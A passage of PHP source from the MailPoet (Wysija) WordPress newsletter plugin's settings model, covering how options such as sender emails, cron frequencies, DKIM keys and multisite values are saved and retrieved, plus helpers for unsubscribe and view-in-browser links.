                        $role_capability = str_replace('rolescap---','',$checkbox);

                        $role_capability_exploded = explode('---', $role_capability);
                        $role = get_role($role_capability_exploded[0]);
                        $capability = 'wysija_'.$role_capability_exploded[1];
                        // added for invalid roles ...

                        // this is a rolecap let's add or remove the cap to the role
                        if( $role ){
                            if( $this->values[$checkbox] ){
                                $role->add_cap( $capability );
                            }else{
                                // remove cap only for roles different of admins
                                if( $role->has_cap( $capability ) && !in_array($role_capability_exploded[0], array('administrator','super_admin')) ){
                                    $role->remove_cap( $capability );
                                }
                            }
                        }

                        // no need to keep these role values in our option, they already are saved in WordPress' roles options
                        unset( $this->values[$checkbox] );
                    }


                }

                $helper_user = WYSIJA::get('user','helper',false,'wysija-newsletters',false);

                // validating the from email
                if( isset( $data['from_email'] ) && !$helper_user->validEmail( $data['from_email'] ) ){
                    if(!$data['from_email']) $data['from_email']=__('empty',WYSIJA);
                    $this->error(sprintf(__('The <strong>from email</strong> value you have entered (%1$s) is not a valid email address.',WYSIJA),$data['from_email']),true);
                    $data['from_email'] = $this->values['from_email'];
                }
                // validating the replyto email
                if(isset($data['replyto_email']) && !$helper_user->validEmail($data['replyto_email'])){
                    if(!$data['replyto_email']) $data['replyto_email']=__('empty',WYSIJA);
                    $this->error(sprintf(__('The <strong>reply to</strong> email value you have entered (%1$s) is not a valid email address.',WYSIJA),$data['replyto_email']),true);
                    $data['replyto_email'] = $this->values['replyto_email'];
                }

                // in that case the admin changed the frequency of the wysija cron meaning that we need to clear it
                // network's method frequency has changed
                if(isset($data['ms_sending_emails_each']) && $data['ms_sending_emails_each']!=$this->getValue('ms_sending_emails_each')){
                    $ms_sending_freq_has_changed = true;
                    $data['last_save'] = time();
                }

                // we're on a single site and the sending frequency has been modified
                // we need to refresh the sending scheduled task down below
                if(isset($data['sending_emails_each']) && $data['sending_emails_each']!=$this->getValue('sending_emails_each')){
                    $sending_freq_has_changed = true;
                    $data['last_save'] = time();
                }

                // we're on a single site and the bounce frequency has been changed
                // we need to refresh the bounce scheduled task down below
                if(isset($data['bouncing_emails_each']) && $data['bouncing_emails_each'] != $this->getValue('bouncing_emails_each')){
                    $bouncing_freq_has_changed = true;
                    $data['last_save'] = time();
                }

                // if saved with gmail then we set up the smtp settings
                if( isset($data['sending_method']) ){
                    if($data['sending_method' ]== 'gmail') {
                        $data['smtp_host'] = 'smtp.gmail.com';
                        $data['smtp_port'] = '465';
                        $data['smtp_secure'] = 'ssl';
                        $data['smtp_auth'] = true;
                    }
                }

                // basic validation of the smtp_host field
                if(isset($data['smtp_host'])){
                    $data['smtp_host'] = trim($data['smtp_host']);
                }

                // specific case to identify common action to different rules there some that don't appear in the interface, yet we use them.
                // BEN: this code needs to be reviewed and retested... I know what is the purpose but I don't understand $indexrule and $ruleMain
                foreach($data as $key => $value){
                    $fs = 'bounce_rule_';
                    if(strpos($key,$fs)!== false){
                        if(strpos($key,'_forwardto')===false){
                            $indexrule = str_replace($fs, '', $key);
                            $helper_rules = WYSIJA::get('rules','helper',false,'wysija-newsletters',false);
                            $rules = $helper_rules->getRules();
                            foreach($rules as $keyy => $vals){
                                if(isset($vals['behave'])){
                                    $ruleMain = $helper_rules->getRules($vals['behave']);
                                    $data[$fs.$vals['key']]=$value;
                                }
                            }
                        }
                    }
                }

                // the regenerate box appeared for old versions of MailPoet where we had to switch from a 512 bits DKIM key to a 1024 for better score with Gmail
                // if the dkim_regenerate box has been ticked then we unset the dkim values so that they are regenerated in the next page load
                if( isset($data['dkim_regenerate']) && $data['dkim_regenerate'] == 'regenerate'){
                    if(isset($this->values['dkim_pubk']))   {
                        unset($data['dkim_pubk']);
                        unset($this->values['dkim_pubk']);
                        unset($data['dkim_privk']);
                        unset($this->values['dkim_privk']);
                        unset($data['dkim_regenerate']);
                    }
                }

                // when we switch the double optin value on to off or off to on, we refresh the total user count which is different in both cases
                if(isset($data['confirm_dbleoptin']) && isset($this->values['confirm_dbleoptin']) && $data['confirm_dbleoptin'] != $this->values['confirm_dbleoptin']){
                    $helper_user = WYSIJA::get('user','helper');
                    $helper_user->refreshUsers();
                }
            }


            $is_multisite = is_multisite();
            $is_network_admin = WYSIJA::current_user_can('manage_network');
            $global_MS_settings = array();
            foreach($data as $key => $value){
                // we detect a ms value, so we put it in a separate array to store it somewhere else central
                if($is_multisite && $is_network_admin && strpos($key, 'ms_')!==false){
                    $global_MS_settings[$key] = $value;
                    continue;
                }

                // verify that the confirm email body contains an activation link
                // if it doesn't add it at the end of the email
                if($key == 'confirm_email_body' && strpos($value, '[activation_link]') === false){
                    $value.="\n".'[activation_link]Click here to confirm your subscription.[/activation_link]';
                }

                // I'm not sure why do we do that, we separate the DKIm wrappers from teh value saved in the option.. why not, there must be a reason
                if($key == 'dkim_pubk'){
                    $value = str_replace(array('-----BEGIN PUBLIC KEY-----','-----END PUBLIC KEY-----',"\n"),'',$value);
                }

                // for the manage subscription option you can select which list appear publicy to the user in their subscription page.
                // this piece of code  make sure that they appear or not
                if($key == 'manage_subscriptions_lists'){
                    $model_list = WYSIJA::get('list','model');
                    $model_list->update(array('is_public'=>0),array('is_public'=>1));
                    $model_list->reset();
                    $model_list->update(array('is_public'=>1),array('list_id'=>$value));

                    unset($this->values[$key]);
                }

                // we have a variable in this class which is defaults
                // we save the option only if its value is different than the default one: no need to overload the db.
                if(!isset($this->defaults[$key]) || (isset($this->defaults[$key]) && $value!=$this->defaults[$key])){
                    $this->values[$key] =  $value;
                }else{
                    unset($this->values[$key]);
                }
            }


            // save the confirmation email in the email table
            // IMPORTANT: once we move the confirmation email to the newsletter listing we can get rid of that
            if(isset($data['confirm_email_title']) && isset($data['confirm_email_body'])){
                $model_email = WYSIJA::get('email','model',false,'wysija-newsletters',false);
                $is_multisite = is_multisite();
                // the from email on a multisite with the network method on is coming from the ms value
                if($is_multisite && $data['sending_method'] == 'network') {
                    $from_email = $data['ms_from_email'];
                }else{
                    $from_email = $data['from_email'];
                }
                // updating email
                $model_email->update(array('from_name'=>$data['from_name'],'from_email'=>$from_email, 'replyto_name'=>$data['replyto_name'],'replyto_email'=>$data['replyto_email'],
                    'subject'=>$data['confirm_email_title'],'body'=>$data['confirm_email_body']),array('email_id'=>$this->values['confirm_email_id']));
            }
            unset($this->values['confirm_email_title']);
            unset($this->values['confirm_email_body']);
        }

        // serialize and encode the option's values and save them in WP's options
        update_option($this->name_option,base64_encode(serialize($this->values)));

        // when we are on a multisite, part of the options need to be saved into a global option common to all of the sites
        if($is_multisite){
            // the network admin has access to that extra information through the interfaces when does interfaces are generated then $dataMultisite is filled with values
            if(!empty($global_MS_settings)){
                if( $ms_sending_freq_has_changed ){
                    // if the sending frequency on the network method has changed, we need to update each single cron task on all of the child sites
                    // we reset an array to clear the cron of every single site using the multisite method
                    update_site_option('ms_wysija_sending_cron',array());
                }

                // get the data which was saved in the global option before
                $data_saved_ms_before = unserialize( base64_decode( get_site_option('ms_'.$this->name_option) ) );

                // if it's not empty we just merge both sets of values
                if( !empty($data_saved_ms_before) ){
                    $global_MS_settings = array_merge($data_saved_ms_before, $global_MS_settings);
                }
                // we save the global ms option
                update_site_option('ms_'.$this->name_option,base64_encode(serialize($global_MS_settings)));
            }

            // let's merge the latest MS modified values with the values of the site's config, this is to avoid a bug after saving
            $data_saved_ms_fresh=unserialize(base64_decode(get_site_option('ms_'.$this->name_option)));
            if(!empty($data_saved_ms_fresh))    $this->values=array_merge($this->values, $data_saved_ms_fresh);
        }

        // the sending frequency has changed on that site's settings let's clear the frequency recorded in WP's and wysija's crons
        if($sending_freq_has_changed){
            // WordPress cron clearing
            wp_clear_scheduled_hook('wysija_cron_queue');
            // MailPoet's cron reset
            WYSIJA::set_cron_schedule('queue');
        }

        // same than above but with the bounce frequency
        if($bouncing_freq_has_changed){
            // WordPress cron clearing
            wp_clear_scheduled_hook('wysija_cron_bounce');
            // MailPoet's cron reset
            WYSIJA::set_cron_schedule('bounce');
        }

        // if it has been saved through the interface we notify the admin
        if($saved_through_interfaces){
            $this->notice(__('Your settings are saved.',WYSIJA));
        }
    }


    /**
     * some values in the settings needs to be overridden by ms values this is used in the getValue function
     * it's a filter because of the premium plugin interacting with it
     * eg bounce with ms_bounce
     * @param array $ms_overriden
     * @return array
     */
    function ms_override($ms_overriden){
        if($this->getValue('premium_key')){
             $bounce_value = array('bounce','bouncing');
            return array_merge($ms_overriden, $bounce_value);
        }
        return $ms_overriden;
    }

    /**
     * Return  a setting value from our encoded config WordPress' option
     * @param string $key
     * @param type $default
     * @return mixed
     */
    function getValue($key, $default = false) {

        // special case for multisite
        if(is_multisite() && $key != 'premium_key'){

            // if we're getting the from email value we set a default value for the ms FROM
            if($key == 'ms_from_email' && !isset($this->defaults['ms_from_email'])){
                $helper_toolbox = WYSIJA::get('toolbox','helper');
                if(is_object($helper_toolbox)){
                    $this->defaults['ms_from_email'] = 'info@' . $helper_toolbox->_make_domain_name(network_site_url());
                }
            }

            $values_overridden_by_multisite = array();

            // apply a filter to add key/values to
            add_filter('mpoet_ms_override', array($this, 'ms_override'), 1);
            $values_overidden_by_bounce = apply_filters('mpoet_ms_override',$values_overridden_by_multisite);

            foreach($values_overidden_by_bounce as $key_part_bounce){
                if(strpos($key, $key_part_bounce . '_') !== false && strpos($key, 'ms_' . $key_part_bounce . '_') === false){
                    $key = 'ms_' . $key;
                    break;
                }
            }
            if($key == 'beta_mode'){
                $key = 'ms_'.$key;
            }
        }

        if(isset($this->values[$key])) {
            if($key == 'pluginsImportableEgg'){
                $helperImport = WYSIJA::get('plugins_import','helper',false,'wysija-newsletters',false);
                foreach($this->values[$key] as $tablename =>$plugInfosExtras){
                    $extra_data = $helperImport->getPluginsInfo($tablename);
                    if($extra_data)  $this->values[$key][$tablename]=array_merge($extra_data,$this->values[$key][$tablename]);
                }
            }

            return $this->values[$key];
        }else{
            // special case for the confirmation email
            if(in_array($key, array('confirm_email_title','confirm_email_body'))){
                $model_email = WYSIJA::get('email','model',false,'wysija-newsletters',false);
                $result_email = $model_email->getOne($this->getValue('confirm_email_id'));
                if($result_email){
                   $this->values['confirm_email_title'] = $result_email['subject'];
                   $this->values['confirm_email_body'] = $result_email['body'];
                   return $this->values[$key];
                }else{
                    if( $default===false && isset($this->defaults[$key])){
                        return $this->defaults[$key];
                    }elseif(!( $default===false)){
                        return $default;
                    }
                }

            }else{

                if($default===false && isset($this->defaults[$key])){
                    return $this->defaults[$key];
                }elseif(!($default===false)){
                    return $default;
                }
            }

        }
        return false;
    }

    /**
     * TODO should this method really be here? It is used when rendering an email or when sending one
     * @param type $editor
     */
    function emailFooterLinks($editor=false){
        $unsubscribe=array();
        $unsubscribetxt=$editsubscriptiontxt='';

        if(!isset($this->values['unsubscribe_linkname'])) $unsubscribetxt=__('Unsubscribe',WYSIJA);
        else $unsubscribetxt=$this->getValue('unsubscribe_linkname');

        if(!isset($this->values['manage_subscriptions_linkname'])) $editsubscriptiontxt=__('Edit your subscription',WYSIJA);
        else $editsubscriptiontxt=$this->getValue('manage_subscriptions_linkname');


        $unsubscribe[0] = array(
                'link' => '[unsubscribe_link]',
                'label' => $unsubscribetxt
            );

        if($this->getValue('manage_subscriptions')){
             $unsubscribe[1] =array(
                'link' => '[subscriptions_link]',
                'label' => $editsubscriptiontxt
            );
        }

        if($editor){
            $modelU=WYSIJA::get('user','model',false,'wysija-newsletters',false);

            $unsubscribe[0]['link'] = $modelU->getConfirmLink(false,'unsubscribe',false,true).'&demo=1';
            if($this->getValue('manage_subscriptions')) $unsubscribe[1]['link'] = $modelU->getConfirmLink(false,'subscriptions',false,true);
        }

        return $unsubscribe;
    }

    /**
     * TODO should this method really be here?
     * It is used when rendering an email in the editor or before sending it
     * @param boolean $editor if the link is in the editor, then it will be a demo link
     * @return type
     */
    function viewInBrowserLink($editor = false){
        $data = array();

        if($this->getValue('viewinbrowser')){
           $vib_link_text = '';
           // we us the user defined value or the predefined text
           if(!isset($this->values['viewinbrowser_linkname'])){
               $vib_link_text = $this->cleanTrans(__('Display problems? [link]View this newsletter in your browser.[/link]',WYSIJA));
           }else{
               $vib_link_text = $this->getValue('viewinbrowser_linkname');
           }

           // if we spot a link tag in the text we decompose the text in different parts pre rendering
           if(strpos($vib_link_text, '[link]') !== false){
                $linkpre = explode('[link]', $vib_link_text);
                $data['pretext'] = $linkpre[0];
                $linkpost = explode('[/link]', $linkpre[1]);
                $data['posttext'] = $linkpost[1];
                $data['label'] = $linkpost[0];
                $data['link'] = '[view_in_browser_link]';
           }
        }

        if($editor){
            $params_url = array(
                'wysija-page' => 1,
                'controller' => 'email',
                'action' => 'view',
                'email_id' => 0,
                'user_id' => 0
                );
            if(!empty($_REQUEST['id'])){
                $params_url['email_id'] = (int)$_REQUEST['id'];
            }
            $data['link'] = WYSIJA::get_permalink($this->getValue('confirm_email_link'),$params_url);
        }

        return $data;
    }
}
